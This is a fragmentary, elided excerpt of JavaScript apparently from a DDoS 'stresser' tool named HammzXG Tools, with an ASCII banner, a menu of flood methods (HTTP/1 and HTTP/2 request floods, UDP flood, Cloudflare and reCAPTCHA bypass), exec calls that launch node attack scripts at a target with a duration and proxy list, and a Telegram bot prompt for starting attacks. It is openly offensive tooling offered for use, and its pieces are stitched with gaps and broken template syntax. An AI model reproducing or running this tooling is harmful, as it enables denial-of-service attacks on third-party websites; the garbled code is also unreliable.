...
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
                      ...
                      HammzXG Tools Has Been Attacking
========================================================================
      ...
      sigma()
       ...
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'hammz') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'hammz-blackhole') {
       pushOngoing(target, methods, duration)
...
const harder = path.join(__dirname, `hammz-blackhole`);
        exec(`node ${glory} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${hammz-blackhole} ${target} ${duration} 32 8 proxy.txt`)
          sigma()
          } else {
...
// [==================================================================================] //
      async function startAttackPrompt(telegramId, Sikma) {
        ...
        Sikma.once('message', async (msg) => {
          ...
          } else if (yabe === 'Hammz-blackhole') {
            yabai = 'hammz-blackhole';
            methods = path.join(__dirname, `4`);
              kimakk = `node ${methods} ${target} ${duration} 32 10 proxy.txt`;
          } else if (yabe === 'Bypass-hammz') {
            yabai = 'bypass-hammz';
            methods = path.join(__dirname, `9`);
              kimakk = `node ${methods} ${target} ${duration} 100 10 proxy.txt`;
          } else if (yabe === 'Hammz-entot') {
            yabai = 'hammz-entot';
...
► VIP
     ...
     - hammz  ► HIGH REQ/S H2│  - hammz-spam ► HTTP1 SPAM REQ
──────────────────────────────
`);
    sigma();
...
\x1b[31m♦\x1b[0m HAMMZ-SPACE         │ High Rps Bypass Non Protect              
\x1b[31m♦\x1b[0m HAMMZ-SPIN       │ Flooding Request With Http2
\x1b[31m♦\x1b[0m BYPASS-HAMMZ      │ Bypass Protect Website
\x1b[31m♦\x1b[0m KILL-HAMMZ       │ Good For Non Ssl Target          
\x1b[31m♦\x1b[0m HAMMZ-ENTOT       │ Bypass Recaptcha With Good Header
\x1b[31m♦\x1b[0m HAMMZ-LUCKY         │ Flood Request With Http1
...
\x1b[31m♦\x1b[0m HAMMZ-BLACKHOLE      │ Bypass Hard Target
\x1b[31m♦\x1b[0m STARS       │ Bypass Normal Web
\x1b[31m♦\x1b[0m HTTP1       │ Http/1 Only
\x1b[31m♦\x1b[0m HAMMZ       │ Bypass Cf With High Req
...
${creatorCredits}`);
 ...
 contoh => TLS https://website.com 443 60`);
    ...
    udp_flood(args);
  } else if (command === 'HAMMZ-SPIN') {
  	flood(args);
  } else if (command === 'HAMMZ-SPACE') {
  	tls(args);
  } else if (command === 'KILL-HAMMZ') {
  	ninja(args);
  } else if (command === 'HAMMZ-BLACKHOLE') {
  	harder(args);
  } else if (command === 'GLORY') {
  	glory(args);
  } else if (command === 'HAMMZ-ENTOT') {
  	httpx(args);
  } else if (command === 'SIGMA') {
  	sigma(args);
  } else if (command === 'BOMB') {
  	bomb(args);
  } else if (command === 'BYPASS-HAMMZ') {
  	bypass(args);
  	...
  	pluto(args);
  } else if (command === 'HAMMZ') {
  	storm(args);
  } else if (command === 'HAMMZ-LUCKY') {
  	raw(args);
    ...
    console.log(`Hammz Ai Ragbot Started
